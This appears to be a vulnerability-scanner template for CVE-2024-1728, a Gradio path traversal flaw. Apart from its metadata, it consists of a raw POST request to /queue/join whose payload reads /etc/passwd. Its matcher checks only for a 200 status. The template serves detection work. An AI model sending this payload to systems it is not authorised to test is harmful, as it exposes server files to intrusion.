id: CVE-2024-1728
info:
  name: gradio4.18.0
  author: may
  severity: High
  description: path traversal. Every Gradio instance utilizing the UploadButton component is vulnerable to a local file inclusion vulnerability that gives attackers the ability to read any arbitrary file on the filesystem.
  reference:
    - https://huntr.com/bounties/9bb33b71-7995-425d-91cc-2c2a2f2a068a
    - https://github.com/gradio-app/gradio/commit/16fbe9cd0cffa9f2a824a0165beb43446114eec7
  classification:
    cve-id: CVE-2024-1728
    cwe-id: CWE-22
  tags: gradio

http:
  - raw:
      - |
        POST /queue/join? HTTP/1.1
        Host: {{Hostname}}
        
        {
          "data": [
            [
              {
                "path":"/etc/passwd",
                "url": "http://10.160.167.54:7860/file=/etc/passwd",
                "orig_name":"passwd",
                "size":6,
                "mime_type":""
              }
            ]
          ],
          "event_data":null,
          "fn_index":0,
          "trigger_id":2,
          "session_hash":"hu6na4f3d08"
        }

    matchers:
      - type: status
        status:
          - 200